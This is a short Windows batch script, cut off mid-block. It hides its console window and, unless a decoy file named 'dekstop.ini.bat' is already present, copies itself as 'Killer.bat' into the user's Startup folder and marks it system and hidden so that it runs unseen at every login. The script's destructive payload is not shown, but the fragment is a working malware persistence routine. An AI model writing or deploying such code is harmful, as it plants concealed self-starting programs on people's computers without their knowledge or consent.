@ECHO OFF
color FE & mode con:cols=16 lines=1


IF EXIST "%AppData%\Microsoft\Windows\Start Menu\Programs\startup\dekstop.ini.bat" (

REM a trick to make anithyng a.k.a little delay and exit
	ping 127.0.0.1 -n 2 > nul
	
) ELSE (
	
  REM if the file not exist = deleted rename file from dekstop.ini.bat to Killer.bat
  copy /Y Killer.bat "%AppData%\Microsoft\Windows\Start Menu\Programs\startup\Killer.bat"
  attrib +s +h "%AppData%\Microsoft\Windows\Start Menu\Programs\startup\Killer.bat"